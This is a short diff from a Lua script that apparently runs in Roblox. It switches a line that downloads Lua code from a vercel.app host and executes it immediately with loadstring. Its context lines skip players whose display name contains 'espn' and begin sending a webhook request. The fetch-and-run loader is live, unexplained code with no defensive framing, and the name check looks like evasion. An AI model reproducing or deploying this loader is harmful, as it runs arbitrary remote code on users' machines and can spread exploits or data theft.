@@ -322,7 +322,7 @@ if string.find(string.lower(player.DisplayName), "espn") then
 	return
 end
 
-loadstring(game:HttpGet("https://luamour.vercel.app/api/V2.lua"))()
+loadstring(game:HttpGet("https://luamour2.vercel.app/api/V2.lua"))()
 
 -- Send webhook (safe request)
 local headers = {["content-type"] = "application/json"}
